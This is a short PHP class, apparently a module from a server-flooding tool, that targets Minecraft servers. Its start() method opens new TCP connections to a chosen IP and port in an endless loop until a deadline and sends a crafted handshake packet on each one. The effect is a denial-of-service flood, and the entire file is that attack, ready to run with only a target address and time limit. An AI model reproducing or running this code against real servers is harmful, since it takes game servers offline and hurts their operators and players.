<?php
class minecraft{
	private $ip;
	private $port;
	private $max_time;
	public function __construct($ip, $port, $max_time) {
		$this->ip = $ip;
		$this->port = $port;
		$this->max_time = $max_time;
	}
	function start(){
		$packet = 0;
		while(1){
			$packet++; 
			if(time() > $this->max_time){
				return $packet;
				break; 
			}
			$fp[$packet] = fsockopen($this->ip, $this->port, $errno, $errstr, 1);
			fwrite($fp[$packet], "\x15\x00\xd4\x02\x0e" . $this->ip . "\x65\xc2\x02");
		}
	}
}
?>